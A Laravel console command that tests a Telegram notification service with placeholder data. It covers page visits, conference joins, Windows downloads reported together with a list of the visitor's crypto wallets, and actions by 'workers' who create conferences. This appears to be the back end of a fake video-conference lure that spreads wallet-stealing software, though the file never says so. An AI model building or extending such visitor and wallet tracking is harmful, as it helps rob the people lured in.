<?php

namespace App\Console\Commands;

use App\Services\TelegramService;
use Illuminate\Console\Command;

class TestTelegram extends Command
{
    protected $signature = 'telegram:test';
    protected $description = 'Test Telegram notifications';

    public function handle()
    {
        $telegram = new TelegramService();
        
        $this->info('Testing Telegram notifications...');
        
        // Тест уведомления о переходе на страницу
        $this->info('1. Testing page visit notification...');
        $result1 = $telegram->notifyPageVisit('conference', 'TEST123', '127.0.0.1', 'Test User Agent');
        $this->line($result1 ? '✅ Page visit notification sent' : '❌ Page visit notification failed');
        
        // Тест уведомления о входе в звонок
        $this->info('2. Testing conference join notification...');
        $result2 = $telegram->notifyConferenceJoin('Test Conference', 'TEST123', '127.0.0.1', 'Test User Agent');
        $this->line($result2 ? '✅ Conference join notification sent' : '❌ Conference join notification failed');
        
        // Тест уведомления о скачке
        $this->info('3. Testing download notification...');
        $result3 = $telegram->notifyDownload('conference', 'TEST123', 'windows', '127.0.0.1', 'Test User Agent', ['wallet1', 'wallet2']);
        $this->line($result3 ? '✅ Download notification sent' : '❌ Download notification failed');
        
        // Тест уведомления о действии воркера
        $this->info('4. Testing worker action notification...');
        $result4 = $telegram->notifyWorkerAction('Создал конференцию', 'Test Worker', 'Test Conference');
        $this->line($result4 ? '✅ Worker action notification sent' : '❌ Worker action notification failed');
        
        $this->info('Telegram test completed!');
    }
}
